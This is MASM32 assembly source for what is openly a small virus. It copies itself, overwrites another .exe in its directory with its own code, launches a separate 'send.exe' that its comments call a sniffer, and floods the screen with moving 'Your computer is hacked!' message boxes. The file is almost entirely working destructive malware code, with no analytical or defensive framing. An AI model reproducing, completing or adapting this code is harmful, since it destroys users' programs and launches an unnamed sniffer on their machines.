.386
.model flat,stdcall
option casemap:none

include \masm32\include\windows.inc
include \masm32\include\kernel32.inc
include \masm32\include\masm32.inc
include \masm32\include\user32.inc

includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\masm32.lib
includelib \masm32\lib\user32.lib

.data
; initial data for listing and modifying files
searchPattern    byte "*.exe", 0                ; 定義搜索模式，"*.*" 代表所有文件
; WIN32_FIND_DATA is a masm32 predefined struct. We will use the column of "cFileName" later.
findData         WIN32_FIND_DATA <>             ; 用於存儲找到的檔案信息.
hFind            dword 0                        ; 查找句柄
next_line        word  0Dh,0Ah,0
excludeFileName  byte "send.exe", 0             ; 不進行覆寫的檔案名

; path of the sniffer
cmdLine   byte "send.exe", 0
startInfo STARTUPINFO <?>
procInfo  PROCESS_INFORMATION <?>

;複製自己.exe
originalFileName byte  "Final.exe", 0
copyFileName     byte  "copy.exe", 0    
tests            byte  "virus-infected",0
; "h" means handler
hOriginalFile   dword ?
hCopyFile        dword ?

; buffer will be used to copy files
bufferSize       dword 4096
buffer           byte  4096 dup(?)

hStdOut          dword ?              ; standard output handler
bytesRead        dword ?              ; count of bytes read by ReadFile
bytesWritten     dword ?              ; count of bytes written by WriteConsole/WriteFile

pos1 dword ?
pos2 dword ?
repeatTime dword 500

msgText byte "Your computer is hacked!",0
msgTitle1 byte "Message Box1",0
msgTitle2 byte "Message Box2",0
msgTitle3 byte "Message Box3",0
msgTitle4 byte "Message Box4",0
msgTitle5 byte "Message Box5",0
msgTitle6 byte "Message Box6",0
msgTitle7 byte "Message Box7",0
msgTitle8 byte "Message Box8",0
msgTitle9 byte "Message Box9",0
msgTitle10 byte "Message Box10",0
msgTitle11 byte "Message Box11",0
msgTitle12 byte "Message Box12",0
msgTitle13 byte "Message Box13",0
msgTitle14 byte "Message Box14",0
msgTitle15 byte "Message Box15",0

hThread1 dword ?
hThread2 dword ?
hThread3 dword ?
hThread4 dword ?
hThread5 dword ?
hThread6 dword ?
hThread7 dword ?
hThread8 dword ?
hThread9 dword ?
hThread10 dword ?
hThread11 dword ?
hThread12 dword ?
hThread13 dword ?
hThread14 dword ?
hThread15 dword ?
threadId1 dword ?
threadId2 dword ?
threadId3 dword ?
threadId4 dword ?
threadId5 dword ?
threadId6 dword ?
threadId7 dword ?
threadId8 dword ?
threadId9 dword ?
threadId10 dword ?
threadId11 dword ?
threadId12 dword ?
threadId13 dword ?
threadId14 dword ?
threadId15 dword ?

count dword 1

.code

ThreadProc1 PROC
    invoke MessageBox, NULL, addr msgText, addr msgTitle1, MB_ICONERROR
    ret
ThreadProc1 ENDP

ThreadProc2 PROC
    invoke MessageBox, NULL, addr msgText, addr msgTitle2, MB_ICONERROR
    ret
ThreadProc2 ENDP

ThreadProc3 PROC
    invoke MessageBox, NULL, addr msgText, addr msgTitle3, MB_ICONERROR
    ret
ThreadProc3 ENDP

ThreadProc4 PROC
    invoke MessageBox, NULL, addr msgText, addr msgTitle4, MB_ICONERROR
    ret
ThreadProc4 ENDP

ThreadProc5 PROC
    invoke MessageBox, NULL, addr msgText, addr msgTitle5, MB_ICONERROR
    ret
ThreadProc5 ENDP

ThreadProc6 PROC
    invoke MessageBox, NULL, addr msgText, addr msgTitle6, MB_ICONERROR
    ret
ThreadProc6 ENDP

ThreadProc7 PROC
    invoke MessageBox, NULL, addr msgText, addr msgTitle7, MB_ICONERROR
    ret
ThreadProc7 ENDP

ThreadProc8 PROC
    invoke MessageBox, NULL, addr msgText, addr msgTitle8, MB_ICONERROR
    ret
ThreadProc8 ENDP

ThreadProc9 PROC
    invoke MessageBox, NULL, addr msgText, addr msgTitle9, MB_ICONERROR
    ret
ThreadProc9 ENDP

ThreadProc10 PROC
    invoke MessageBox, NULL, addr msgText, addr msgTitle10, MB_ICONERROR
    ret
ThreadProc10 ENDP

ThreadProc11 PROC
    invoke MessageBox, NULL, addr msgText, addr msgTitle11, MB_ICONERROR
    ret
ThreadProc11 ENDP

ThreadProc12 PROC
    invoke MessageBox, NULL, addr msgText, addr msgTitle12, MB_ICONERROR
    ret
ThreadProc12 ENDP

ThreadProc13 PROC
    invoke MessageBox, NULL, addr msgText, addr msgTitle13, MB_ICONERROR
    ret
ThreadProc13 ENDP

ThreadProc14 PROC
    invoke MessageBox, NULL, addr msgText, addr msgTitle14, MB_ICONERROR
    ret
ThreadProc14 ENDP

ThreadProc15 PROC
    invoke MessageBox, NULL, addr msgText, addr msgTitle15, MB_ICONERROR
    ret
ThreadProc15 ENDP

; 用於換行, there is no crlf in masm32 lib
crlf PROC
invoke WriteConsole, hStdOut, ADDR next_line, \
    sizeof next_line - 1, ADDR bytesWritten, NULL
ret

crlf ENDP

main PROC
get_handle:
    invoke GetStdHandle, STD_OUTPUT_HANDLE
    mov hStdOut, eax
test_message:
    invoke WriteConsole, hStdOut, ADDR tests, LENGTHOF tests - 1, ADDR bytesWritten, NULL
    call crlf

    ;複製自己.exe
open_self_file1:
    invoke CreateFile, ADDR originalFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL
    mov hOriginalFile, eax

open_copy_file:
    ; create copy file
    invoke CreateFile, ADDR copyFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL
    mov hCopyFile, eax

copy_file:
    ; copy content of exe file
    .REPEAT
        invoke ReadFile, hOriginalFile, ADDR buffer, bufferSize, ADDR bytesRead, NULL
        invoke WriteFile, hCopyFile, ADDR buffer, bytesRead, ADDR bytesRead, NULL
    .UNTIL bytesRead == 0

find_file:
    ; 開始檔案查找
    invoke FindFirstFile, ADDR searchPattern, ADDR findData
    mov hFind, eax
    test eax, eax
    jz end_listing

output_file:
    ; 輸出檔案名
    invoke lstrlen, ADDR findData.cFileName    ; count length until null byte, result is stored in eax
    invoke WriteConsole, hStdOut, ADDR findData.cFileName, \
           eax, ADDR bytesWritten, NULL
    call crlf

    ; 檢查是否為 原始檔 或 send.exe
    invoke lstrcmpi, ADDR findData.cFileName, ADDR originalFileName
    .IF eax == 0
        jmp next_file                    ; if it is original file, dont destroy or replace
    .ENDIF
    invoke lstrcmpi, ADDR findData.cFileName, ADDR copyFileName
    .IF eax == 0
        jmp next_file                    ; if it is copied file, dont destroy or replace
    .ENDIF
    invoke lstrcmpi, ADDR findData.cFileName, ADDR excludeFileName
    .IF eax == 0
        jmp next_file                    ; if it is send.exe, dont destroy or replace
    .ENDIF
    jmp destroy_file                     ; start destroy and replace

next_file:
    ; 查找下一個檔案
    invoke FindNextFile, hFind, ADDR findData
    test eax, eax
    jnz output_file

    ; 關閉檔案查找句柄
    invoke FindClose, hFind
    jmp end_listing

destroy_file:
    invoke CreateFile,
        ADDR findData.cFileName,
        GENERIC_WRITE,
        0,      ; which means: DO_NOT_SHARE. However, no this constant in masm32
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        0
    mov hCopyFile, eax                 ; keep the file file handler

open_self_file2:
    invoke CreateFile, ADDR originalFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL
    mov hOriginalFile, eax

replace_file:
    ; copy content of exe file
    .IF eax != INVALID_HANDLE_VALUE    ; check if the file was opened successfuly

    .REPEAT
        invoke ReadFile, hOriginalFile, ADDR buffer, bufferSize, ADDR bytesRead, NULL
        invoke WriteFile, hCopyFile, ADDR buffer, bytesRead, ADDR bytesWritten, NULL
    .UNTIL bytesRead == 0

    .ENDIF

end_listing:
    ; close handle of original file
    invoke CloseHandle, hOriginalFile
sniffer:
    ; call sniffer
    mov startInfo.cb, SIZEOF STARTUPINFO
    invoke GetStartupInfo, ADDR startInfo

    invoke CreateProcess, NULL, ADDR cmdLine, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, NULL, ADDR startInfo, ADDR procInfo

pop_up:
    ; 創造thread(線程)
    ; CreateThread is a callback function, we use it to call ThreadProc1
    invoke CreateThread, NULL, 0, addr ThreadProc1, NULL, 0, addr threadId1
    mov hThread1, eax
    
    invoke CreateThread, NULL, 0, addr ThreadProc2, NULL, 0, addr threadId2
    mov hThread2, eax

    invoke CreateThread, NULL, 0, addr ThreadProc3, NULL, 0, addr threadId3
    mov hThread3, eax
    
    invoke CreateThread, NULL, 0, addr ThreadProc4, NULL, 0, addr threadId4
    mov hThread4, eax

    invoke CreateThread, NULL, 0, addr ThreadProc5, NULL, 0, addr threadId5
    mov hThread5, eax

    invoke CreateThread, NULL, 0, addr ThreadProc6, NULL, 0, addr threadId6
    mov hThread6, eax

    invoke CreateThread, NULL, 0, addr ThreadProc7, NULL, 0, addr threadId7
    mov hThread7, eax

    invoke CreateThread, NULL, 0, addr ThreadProc8, NULL, 0, addr threadId8
    mov hThread8, eax

    invoke CreateThread, NULL, 0, addr ThreadProc9, NULL, 0, addr threadId9
    mov hThread9, eax

    invoke CreateThread, NULL, 0, addr ThreadProc10, NULL, 0, addr threadId10
    mov hThread10, eax

    invoke CreateThread, NULL, 0, addr ThreadProc11, NULL, 0, addr threadId11
    mov hThread11, eax

    invoke CreateThread, NULL, 0, addr ThreadProc12, NULL, 0, addr threadId12
    mov hThread12, eax

    invoke CreateThread, NULL, 0, addr ThreadProc13, NULL, 0, addr threadId13
    mov hThread13, eax

    invoke CreateThread, NULL, 0, addr ThreadProc14, NULL, 0, addr threadId14
    mov hThread14, eax

    invoke CreateThread, NULL, 0, addr ThreadProc15, NULL, 0, addr threadId15
    mov hThread15, eax

    ; make sure MessageBoxes hava been created
    invoke Sleep, 100

    mov ecx, repeatTime
random_pos:
    push ecx

    invoke GetTickCount    ; Auto store tickcount to eax
    xor eax, 55AA55AAh     ; add some randomness
    and eax, 03FFh         ; limit random number
    mov pos1, eax           ; store random number

    invoke GetTickCount    ; Auto store tickcount to eax
    xor eax, 0AA55AA55h     ; add some randomness
    and eax, 02DFh         ; limit random number
    mov pos2, eax           ; store random number

    .IF count == 1
        invoke FindWindow, NULL, addr msgTitle1
    .ENDIF
    .IF count == 2
        invoke FindWindow, NULL, addr msgTitle2
    .ENDIF
    .IF count == 3
        invoke FindWindow, NULL, addr msgTitle3
    .ENDIF
    .IF count == 4
        invoke FindWindow, NULL, addr msgTitle4
    .ENDIF
    .IF count == 5
        invoke FindWindow, NULL, addr msgTitle5
    .ENDIF
    .IF count == 6
        invoke FindWindow, NULL, addr msgTitle6
    .ENDIF
    .IF count == 7
        invoke FindWindow, NULL, addr msgTitle7
    .ENDIF
    .IF count == 8
        invoke FindWindow, NULL, addr msgTitle8
    .ENDIF
    .IF count == 9
        invoke FindWindow, NULL, addr msgTitle9
    .ENDIF
    .IF count == 10
        invoke FindWindow, NULL, addr msgTitle10
    .ENDIF
    .IF count == 11
        invoke FindWindow, NULL, addr msgTitle11
    .ENDIF
    .IF count == 12
        invoke FindWindow, NULL, addr msgTitle12
    .ENDIF
    .IF count == 13
        invoke FindWindow, NULL, addr msgTitle13
    .ENDIF
    .IF count == 14
        invoke FindWindow, NULL, addr msgTitle14
    .ENDIF
    .IF count == 15
        mov count, 0
        invoke FindWindow, NULL, addr msgTitle15
    .ENDIF
    test eax, eax
    jz finished
    invoke SetWindowPos, eax, HWND_TOP, pos1, pos2, 0, 0, SWP_NOSIZE

    invoke Sleep, 100

    inc count
    pop ecx

    dec ecx
    jnz random_pos

finished:
    invoke WaitForSingleObject, hThread1, INFINITE
    invoke WaitForSingleObject, procInfo.hProcess, INFINITE

    ; close handles and exit process
    invoke CloseHandle, procInfo.hProcess
    invoke CloseHandle, procInfo.hThread
    invoke CloseHandle, hThread1
    invoke ExitProcess, 0
main ENDP

END main